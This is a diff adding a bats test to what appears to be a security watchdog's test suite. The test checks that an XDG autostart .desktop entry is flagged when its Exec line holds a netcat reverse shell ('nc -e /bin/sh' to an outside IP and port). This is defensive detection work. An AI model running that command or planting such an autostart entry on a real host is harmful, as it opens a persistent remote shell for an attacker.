@@ -275,3 +275,19 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in Exec: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to many other watchdog's nc reverse-shell variant
+    # INVARIANTs across the brain. XDG autostart .desktop entries
+    # are run on every graphical login by every user (and per-
+    # user autostart by the user's own login). T1547.013 — XDG
+    # Autostart Entries; recurring trigger fires once per
+    # graphical login session, and on a multi-user host that's
+    # multiple times per day.
+    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Desktop Entry]\nType=Application\nExec=nc -e /bin/sh 1.1.1.1 4444\n' > "${AUTOD}/evil.desktop"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
